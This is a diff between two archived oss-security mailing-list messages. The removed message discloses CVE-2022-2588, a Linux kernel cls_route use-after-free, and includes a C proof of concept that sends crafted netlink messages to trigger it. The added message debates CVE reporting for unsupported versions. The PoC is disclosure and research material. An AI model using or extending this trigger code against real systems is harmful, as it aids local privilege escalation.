@@ -1,276 +1,48 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2022/08/18/2
-Message-ID: <Yv1PTZIJ4qtA2ndU@quatroqueijos>
-Date: Wed, 17 Aug 2022 17:27:57 -0300
-From: Thadeu Lima de Souza Cascardo <cascardo@...onical.com>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2022/04/29/1
+Message-ID: <CABTdhR-fZD5_vJU4-VyRo3Bz8A-yTZbCPjjUe=4GT6VqM_0VNw@mail.gmail.com>
+Date: Fri, 29 Apr 2022 01:36:21 +0200
+From: Iron-Bound <iron.bound@...il.com>
 To: oss-security@...ts.openwall.com
-Subject: Re: CVE-2022-2588 - Linux kernel cls_route UAF
+Subject: Re: CVE-2022-21449 and version reporting
 Content-Type: text/plain; charset=utf-8
 
-On Tue, Aug 09, 2022 at 02:11:54PM -0300, Thadeu Lima de Souza Cascardo wrote:
-> CVE-2022-2588 - Linux kernel cls_route UAF
-> 
-> It was discovered that the cls_route filter implementation in the Linux kernel
-> would not remove an old filter from the hashtable before freeing it if its
-> handle had the value 0.
-> 
-> Zhenpeng Lin working with Trend Micro's Zero Day Initiative discovered that
-> this vulnerability could be exploited for Local Privilege Escalation. This has
-> been reported as ZDI-CAN-17440, and assigned CVE-2022-2588.
-> 
-> This bug has been present since the first Linux commit git, v2.6.12-rc2.
-> 
-> Exploiting it requires CAP_NET_ADMIN in any user or network namespace.
-> 
-> It can be mitigated by those users who do not rely on cls_route, by adding
-> 'install cls_route /bin/true' to their modprobe.conf or modprobe.d configs,
-> in case it's built as a module.
-> 
-> A PoC that will trigger a WARNING is going to be posted in a week.
-> 
-> Fixes have been sent to netdev@...r.kernel.org and are at
-> https://lore.kernel.org/netdev/20220809170518.164662-1-cascardo@canonical.com/T/#u.
+As for the corp in question, you can expect the legal/PR team is involved
+for any 'perceived' damage.
 
-This has been merged as commit 9ad36309e2719a884f946678e0296be10f0bb4c1.
+> Would you expect Microsoft to evaluate Windows 3.11, Windows 95,
+> Windows 98, Windows ME, Windows NT 3.51, Windows NT 4.0. Windows XP,
+> etc for every single vulnerability discovered in newest products?
 
-And here is the PoC.
+Last time I checked we don't have source to review Microsoft products..
+Would also make the argument that unsupported software having CVE's is an
+extra wedge to force companies to update that old unloved application in
+the corner!
 
+On Thu, Apr 28, 2022 at 11:38 PM Sven Schwedas <sven.schwedas@....at> wrote:
 
-#define _GNU_SOURCE
-#include <sched.h>
-#include <sys/socket.h>
-#include <linux/netlink.h>
-#include <unistd.h>
-#include <stdio.h>
-#include <sys/wait.h>
-#include <stdlib.h>
-#include <string.h>
-#include <linux/pkt_sched.h>
+>
+> On 28.04.22 22:10, Seth Arnold wrote:
+> > On Thu, Apr 28, 2022 at 02:12:04PM +0000, Seaman, Chad wrote:
+> >> In what universe exactly are versions omitted from vulnerability
+> >> reporting because a vendor “no longer supports that version”… this
+> >> non-supported version is still vulnerable?
+> >
+> > A large part of software maintenance is managing technical debt --
+> > and being able to walk away from no-longer-supported products is an
+> > important part of that.
+> >
+> > Would you expect Microsoft to evaluate Windows 3.11, Windows 95,
+> > Windows 98, Windows ME, Windows NT 3.51, Windows NT 4.0. Windows XP,
+> > etc for every single vulnerability discovered in newest products?
+>
+> You and Jeremy arguing in bad faith here, OP didn't ask about anything
+> like that.
+>
+> The problem at hand is, someone *already did all that work*, and Oracle
+> is *actively intervening* to have it dropped from CVE reports.
+>
+> So the question is: Why is vulnerability information that already exists
+> being censored?
+>
 
-#include <sys/types.h>
-#include <sys/ipc.h>
-#include <sys/msg.h>
-#include <stdlib.h>
-
-
-static char newlink[] = {
-	/* len */
-	56, 0x00, 0x00, 0x00,
-	/* type = NEWLINK */
-	16, 0x00,
-	/* flags = NLM_F_REQUEST | NLM_F_CREATE */
-	0x01, 0x04,
-	/* seq */
-	0x01, 0x00, 0x00, 0x00,
-	/* pid */
-	0x00, 0x00, 0x00, 0x00,
-	/* ifi_family */
-	0x00, 0x00, 0x00, 0x00,
-	/* ifi_ifindex */
-	0x30, 0x00, 0x00, 0x00,
-	/* ifi_flags */
-	0x00, 0x00, 0x00, 0x00,
-	/* ifi_change */
-	0x00, 0x00, 0x00, 0x00,
-	/* nla_len, nla_type */
-	0x08, 0x00, 0x03, 0x00,
-	/* string */
-	'e', 't', '2', 0,
-	/* nla_len, nla_type */
-	16, 0x00, 18, 0x00,
-	/* nested nla_len, nla_type */
-	10, 0x00, 0x01, 0x00,
-	'd', 'u', 'm', 'm',
-	'y', 0x00, 0x00, 0x00,
-};
-
-static char dellink[] = {
-	/* len */
-	40, 0x00, 0x00, 0x00,
-	/* type = DELLINK */
-	17, 0x00,
-	/* flags = NLM_F_REQUEST | NLM_F_CREATE */
-	0x01, 0x04,
-	/* seq */
-	0x01, 0x00, 0x00, 0x00,
-	/* pid */
-	0x00, 0x00, 0x00, 0x00,
-	/* ifi_family */
-	0x00, 0x00, 0x00, 0x00,
-	/* ifi_ifindex */
-	0x00, 0x00, 0x00, 0x00,
-	/* ifi_flags */
-	0x00, 0x00, 0x00, 0x00,
-	/* ifi_change */
-	0x00, 0x00, 0x00, 0x00,
-	/* nla_len, nla_type */
-	0x08, 0x00, 0x03, 0x00,
-	/* string */
-	'e', 't', '2', 0,
-};
-
-static char tfilter[] = {
-	/* len */
-	68, 0x00, 0x00, 0x00,
-	/* type = NEWTFILTER */
-	44, 0x00,
-	/* flags = NLM_F_REQUEST | NLM_F_CREATE */
-	0x41, 0x04,
-	/* seq */
-	0x01, 0x00, 0x00, 0x00,
-	/* pid */
-	0x00, 0x00, 0x00, 0x00,
-	/* tcm_family */
-	0x00, 0x00, 0x00, 0x00,
-	/* tcm_ifindex */
-	0x30, 0x00, 0x00, 0x00,
-	/* tcm_handle */
-	0x00, 0x00, 0x00, 0x00,
-	/* tcm_parent */
-	0x00, 0x00, 0x01, 0x00,
-	/* tcm_info = protocol/prio */
-	0x01, 0x00, 0x01, 0x00,
-	/* nla_len, nla_type */
-	0x0a, 0x00, 0x01, 0x00,
-	/* string */
-	'r', 'o', 'u', 't',
-	'e', 0, 0, 0,
-	/* OPTIONS */
-	0x14, 0x00, 0x02, 0x00,
-	/* ROUTE4_TO */
-	0x08, 0x00, 0x02, 0x00,
-	0x00, 0x00, 0x00, 0x00,
-	/* ROUTE4_FROM */
-	0x08, 0x00, 0x03, 0x00,
-	0x00, 0x00, 0x00, 0x00,
-};
-
-static char ntfilter[] = {
-	/* len */
-	56, 0x00, 0x00, 0x00,
-	/* type = NEWTFILTER */
-	44, 0x00,
-	/* flags = NLM_F_REQUEST | NLM_F_CREATE */
-	/* 0x200 = NLM_F_EXCL */
-	0x41, 0x04,
-	/* seq */
-	0x01, 0x00, 0x00, 0x00,
-	/* pid */
-	0x00, 0x00, 0x00, 0x00,
-	/* tcm_family */
-	0x00, 0x00, 0x00, 0x00,
-	/* tcm_ifindex */
-	0x30, 0x00, 0x00, 0x00,
-	/* tcm_handle */
-	0x00, 0x00, 0x00, 0x00,
-	/* tcm_parent */
-	0x00, 0x00, 0x01, 0x00,
-	/* tcm_info = protocol/prio */
-	0x01, 0x00, 0x01, 0x00,
-	/* OPTIONS */
-	0x14, 0x00, 0x02, 0x00,
-	/* ROUTE4_TO */
-	0x08, 0x00, 0x02, 0x00,
-	0x01, 0x00, 0x00, 0x00,
-	/* ROUTE4_FROM */
-	0x08, 0x00, 0x03, 0x00,
-	0x00, 0x00, 0x00, 0x00,
-};
-
-
-static char linkcmd[] = {
-	/* len */
-	44, 0x00, 0x00, 0x00,
-	/* type = NEWQDISC */
-	36, 0x00,
-	/* flags = NLM_F_REQUEST | NLM_F_CREATE | NLM_F_REPLACE */
-	0x01, 0x05,
-	/* seq */
-	0x01, 0x00, 0x00, 0x00,
-	/* pid */
-	0x00, 0x00, 0x00, 0x00,
-	/* tcm_family */
-	0x00, 0x00, 0x00, 0x00,
-	/* tcm_ifindex */
-	0x30, 0x00, 0x00, 0x00,
-	/* tcm_handle */
-	0x00, 0x00, 0x01, 0x00,
-	/* tcm_parent */
-	0xff, 0xff, 0xff, 0xff,
-	/* tcm_info = protocol/prio */
-	0x00, 0x00, 0x00, 0x00,
-	/* nla_len, nla_type */
-	0x04, 0x00, 0x01, 0x00,
-	/* string */
-};
-
-int build_qfq(char *buf)
-{
-	char *qopt;
-	short *tlen;
-	char *qdisc = "qfq";
-
-	short *optlen;
-	short *opttype;
-
-	tlen = buf;
-
-	memset(buf, 0, sizeof(buf));
-	memcpy(buf, linkcmd, sizeof(linkcmd));
-	strcpy(buf+sizeof(linkcmd), qdisc);
-	*tlen = sizeof(linkcmd) + strlen(qdisc) + 1;
-	buf[36] = strlen(qdisc)+5;
-
-	qopt = buf + *tlen;
-	/* nla_len, nla_type */
-	/* 24, 0x00, 0x02, 0x00, */
-	optlen = qopt;
-	opttype = optlen + 1;
-	*opttype = 0x2;
-
-	*optlen = 4;
-
-	*tlen += *optlen;
-
-	return *tlen;
-}
-
-int main(int argc, char **argv)
-{
-	int s;
-	pid_t p;
-	int *error;
-	char buf[4096];
-	int tlen;
-	error = (int *) (buf + 16);
-
-	unsigned long count = 1;
-	int i;
-
-	unshare(CLONE_NEWUSER|CLONE_NEWNET);
-	tlen = build_qfq(buf);
-
-	s = socket(AF_NETLINK, SOCK_RAW|SOCK_NONBLOCK, NETLINK_ROUTE);
-	write(s, newlink, sizeof(newlink));
-	read(s, buf, sizeof(buf));
-	printf("%d\n", *error);
-
-	write(s, buf, tlen);
-	read(s, buf, sizeof(buf));
-	printf("%d\n", *error);
-
-	write(s, tfilter, sizeof(tfilter));
-	read(s, buf, sizeof(buf));
-	printf("%d\n", *error);
-
-	write(s, ntfilter, sizeof(ntfilter));
-	read(s, buf, sizeof(buf));
-	printf("%d\n", *error);
-
-	write(s, dellink, sizeof(dellink));
-	read(s, buf, sizeof(buf));
-	printf("%d\n", *error);
-
-
-	return 0;
-}
